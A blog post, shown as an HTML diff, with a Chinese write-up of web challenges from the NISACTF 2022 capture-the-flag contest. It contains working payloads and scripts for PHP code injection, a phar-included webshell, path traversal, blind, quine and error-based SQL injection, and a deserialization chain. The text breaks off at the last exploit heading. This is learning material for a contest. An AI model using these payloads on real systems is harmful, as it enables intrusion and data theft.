@@ -263,6 +263,265 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/%E3%80%90NISACTF%E3%80%91write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/03/27/%E3%80%90NISACTF%E3%80%91write-up/" itemprop="url">【NISACTF】write up</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-27T17:47:06+08:00">
+                2022-03-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index">
+                    <span itemprop="name">write up</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>福师大的校赛，有些很简单的题就不写了，这个wp主要是记录下学习到的东西，也不算wp其实，因为有些题是后面复现的。</p>
+</blockquote>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p><img src="https://s2.loli.net/2022/03/27/DHKmfTdbhg3v9Lz.png"></p>
+<p>这题看代码颜色都能感觉到不对，使用了特殊的编码，因此要进行URL编码来进行GET传参，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6L3H%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6N1SACTF</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-up"><a href="#level-up" class="headerlink" title="level-up"></a>level-up</h2><p>五层关卡，前四层都是做过的，主要写下第五层，源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//sorry , here is true last level</span><br><span class="line">//^_^</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;str.php&quot;;</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$a))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a(&#x27;&#x27;,$b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的考点是匿名函数的使用，主要是看到<code>$a(&#39;&#39;,$b);</code>这个代码，那么我们可以使用create_function()匿名函数代码注入，这个函数填入两个参数，前一个是函数名，后一个是函数内容，因此可以执行。payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%5ccreate_function&amp;b=2;&#125;system(&#x27;cat /flag&#x27;);/*</span><br></pre></td></tr></table></figure>
+
+<h2 id="bingdundun"><a href="#bingdundun" class="headerlink" title="bingdundun~"></a>bingdundun~</h2><p>这题看了wp才发现当初几乎都做出来了，就差一点，有点可惜。</p>
+<p>进入网页发现可以点击upload，点击后提示可以上传图片或压缩包，并且发现url有意思文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?bingdundun=upload</span><br></pre></td></tr></table></figure>
+
+<p>上传文件测试发现应该是白名单，因此没办法上传配置文件和php文件，而文件包含也过滤了<code>php://</code>、<code>data://</code>等伪协议，但是发现<code>phar://</code>没有被过滤，结合可以上传压缩包，这题应该就是考phar压缩包伪协议的包含了。</p>
+<p>那么我们写一个一句马并打包上传，获取到文件名，然后用phar伪协议构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?bingdundun=phar://579eb57ccc73842341f80c475b04738b.zip/shell</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接，根目录获取flag。我当时包含的时候最后写的是shell.php而不是shell导致没包含成功，我好气啊。</p>
+<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>这题当时都没看，赛后补票了属于是。</p>
+<p>源码提示<code>/source</code>，那就去查看下，审计python代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, redirect, g, send_from_directory</span><br><span class="line">import sqlite3</span><br><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = &quot;&quot;&quot;CREATE TABLE files (</span><br><span class="line">id text primary key,</span><br><span class="line">path text</span><br><span class="line">);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    g_db = getattr(g, &#x27;_database&#x27;, None)</span><br><span class="line">    if g_db is None:</span><br><span class="line">        g_db = g._database = sqlite3.connect(&quot;database.db&quot;)</span><br><span class="line">    return g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.before_first_request</span><br><span class="line">def setup():</span><br><span class="line">    os.remove(&quot;database.db&quot;)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    Select image to upload:</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!-- /source --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/source&#x27;)</span><br><span class="line">def source():</span><br><span class="line">    return send_from_directory(directory=&quot;/var/www/html/&quot;, path=&quot;www.zip&quot;, as_attachment=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def upload():</span><br><span class="line">    if &#x27;file&#x27; not in request.files:</span><br><span class="line">        return redirect(&#x27;/&#x27;)</span><br><span class="line">    file = request.files[&#x27;file&#x27;]</span><br><span class="line">    if &quot;.&quot; in file.filename:</span><br><span class="line">        return &quot;Bad filename!&quot;, 403</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().hex</span><br><span class="line">    try:</span><br><span class="line">        cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,))</span><br><span class="line">    except sqlite3.IntegrityError:</span><br><span class="line">        return &quot;Duplicate file&quot;</span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(&#x27;uploads/&#x27; + file.filename)</span><br><span class="line">    return redirect(&#x27;/file/&#x27; + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/file/&lt;id&gt;&#x27;)</span><br><span class="line">def file(id):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(&quot;select path from files where id=?&quot;, (id,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    if res is None:</span><br><span class="line">        return &quot;File not found&quot;, 404</span><br><span class="line"></span><br><span class="line">    # print(res[0])</span><br><span class="line"></span><br><span class="line">    with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure>
+
+<p>发现是路由，重点检查<code>/upload</code>和<code>file</code>，如果文件名中含有<code>.</code>，则返回<code>Bad filename!</code>，然后保存文件并且返回给<code>/file</code>路由。而<code>file</code>路由中有一段打开文件读取的代码，这里存在漏洞，我们更改文件名为<code>//flag</code>，发包后回显文件名，访问对应文件即可获得flag：<br><img src="https://s2.loli.net/2022/03/30/EP9pgsaFHVTMKXZ.png"></p>
+<h2 id="middlerce"><a href="#middlerce" class="headerlink" title="middlerce"></a>middlerce</h2><p>审计代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;</span><br><span class="line">    $txw4ever = $_REQUEST[&#x27;letter&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;</span><br><span class="line">        die(&quot;再加把油喔&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];</span><br><span class="line">        checkdata($command);</span><br><span class="line">        @eval($command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了一片字符，还有二次check，看着都麻了。首先是我们可见的部分，这部分是参考了之前的一道赛题，但是由于<code>%0A</code>也没了，所以就是用PCRE回溯的方法绕过<code>preg_match()</code>。然后这里有个巨坑的点，我之前一直发送字符a一直不行，后来发现a也是被过滤的的……</p>
+<p>然后是第二层，打比赛的时候是要猜的，不过复现时候wp也给出了黑名单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\^|\||\~|assert|print|include|require|\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\_|disk|tcp|cat|tac/i</span><br></pre></td></tr></table></figure>
+
+<p>防了很多方式，不过<code>*</code>没被过滤所以可以构造模糊查询，反引号没被过滤可以构造命令执行。echo被过滤了，不过符号没被过滤，因此构造短标签进行绕过，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `sort /f*`?&gt;&quot;,&quot;$&quot;:&quot;&#x27; + &quot;$&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://1.14.71.254:28118/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<h2 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h2><p>这题描述有直接给语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">$sql=&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;$password&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>其实看到这个语句我就想起之前hgame那题的like注入，最主要列名给你了，所以应该是类似的，所以直接把脚本改一下拿来用，exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">strs = string.printable</span><br><span class="line">url = &quot;http://1.14.71.254:28030/login.php&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,100):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payload = &quot;1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#%&quot;.format(name+j)</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;bilala&quot;,</span><br><span class="line">                &quot;passwd&quot;: payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url, data=data)</span><br><span class="line">            if &quot;wrong&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j, end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char == &#x27;%&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>跑出密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b2f2d15b3ae082ca29697d8dcd420fd7</span><br></pre></td></tr></table></figure>
+
+<p>登录后发现是源码，审计一下重点部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ($row[&#x27;passwd&#x27;] === $password) &#123;</span><br><span class="line">    if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">        die;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die($FLAG);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这里是第五空间的一题改的，没做过这题所以当时没做出来。这里的考点是quine注入，这波学习了。</p>
+<p>具体原理可以参考这几篇文章：<br><a target="_blank" rel="noopener" href="https://www.shysecurity.com/post/20140705-SQLi-Quine">SQLi Quine</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kingbridge/articles/15818673.html">第五空间 2021——yet_another_mysql_injection</a></p>
+<p>核心思想就是让sql语句执行的结果等于sql语句本身，来绕过这个验证。直接用上面文章的payload改一下就好了，由于<code>char()</code>被过滤，可以通过<code>chr()</code>或<code>0x</code>替代。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHR(34),CHR(39)),CHR(63),&quot;?&quot;)/**/AS/**/a#&#x27;,CHR(34),CHR(39)),CHR(63),&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHR(34),CHR(39)),CHR(63),&quot;?&quot;)/**/AS/**/a#&#x27;)/**/AS/**/a#</span><br></pre></td></tr></table></figure>
+
+<p>后来我也找到一个exp可以生成这类payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def quine(data, debug=True):</span><br><span class="line">    if debug: print(data)</span><br><span class="line">    data = data.replace(&#x27;!!&#x27;,&quot;REPLACE(REPLACE(!!,CHAR(34),CHAR(39)),CHAR(33),!!)&quot;)</span><br><span class="line">    blob = data.replace(&#x27;!!&#x27;,&#x27;&quot;!&quot;&#x27;).replace(&quot;&#x27;&quot;,&#x27;&quot;&#x27;)</span><br><span class="line">    data = data.replace(&#x27;!!&#x27;,&quot;&#x27;&quot;+blob+&quot;&#x27;&quot;)</span><br><span class="line">    if debug: print(data)</span><br><span class="line">    return data</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">!!填充的东西执行完之后和data一样</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">data=&quot;&#x27;/**/union/**/select(!!)#&quot;</span><br><span class="line">quine(data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="join-us"><a href="#join-us" class="headerlink" title="join-us"></a>join-us</h2><p>登录页面中存在sql注入，但是这个waf十分之狠，不过or也被过滤以及题目的名字都给我们提示，可能是无列名注入。</p>
+<p>但是我们首先需要知道库名，而as被过滤了，这就导致我们无法通过database()的方式获取库名，我当时也卡在这了。看了wp发现这里要利用报错来进行爆库，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || (select*from aa)#</span><br></pre></td></tr></table></figure>
+
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Table &#x27;sqlsql.aa&#x27; doesn&#x27;t exist</span><br></pre></td></tr></table></figure>
+<p>库名为sqlsql</p>
+<p>接着用extractvalue报错注入获取表名，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 0x73716c73716c)))#</span><br><span class="line">//过滤的是or ，并非or</span><br></pre></td></tr></table></figure>
+<p>表名为Fal_flag和output。坑爹的是flag在output中。</p>
+<p>这里由于column被过滤，因此无法查询列名，使用join无列名注入查列名，payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))#</span><br></pre></td></tr></table></figure>
+<p>列名为data</p>
+<p>最后报错注入配合mid截断得到flag，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,mid((select data from output),1,20)))#</span><br><span class="line"></span><br><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,mid((select data from output),21,40)))#</span><br></pre></td></tr></table></figure>
+
+<h2 id="babyserialize"><a href="#babyserialize" class="headerlink" title="babyserialize"></a>babyserialize</h2><p>下个月恶补要的pop链，这题难度不是很高，刚好拿来练手用。</p>
+<p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun==&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun=$val[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line"></span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun=$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb = $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name=$value;</span><br><span class="line">        if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;ser&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;ser&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//func checkcheck($data)&#123;</span><br><span class="line">//  if(preg_match(......))&#123;</span><br><span class="line">//      die(something wrong);</span><br><span class="line">//  &#125;</span><br><span class="line">//&#125;</span><br><span class="line"></span><br><span class="line">//function hint()&#123;</span><br><span class="line">//    echo &quot;.......&quot;;</span><br><span class="line">//    die();</span><br><span class="line">//&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>出口很明显是NISA类中的__invoke()，入口也显然应该选择TianXiWei类中的__wakeup()。接下来就是构造逻辑链条：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TianXiWei:__wakeup() --&gt; Ilovetxw:__call() --&gt; four:__set() --&gt; Ilovetxw:__toString() --&gt; NISA:__invoke()</span><br></pre></td></tr></table></figure>
+
+<p>由于waf对危险函数的过滤，这里要利用php原生类来读取，用<code>GlobIterator(\&quot;/f*\&quot;)</code>来读取文件名，再用<code>SplFileObject(&quot;php://filter/convert.base64-encode/resource=/fllllllaaag&quot;)</code>来读取文件。</p>
+<p>exp：</p>
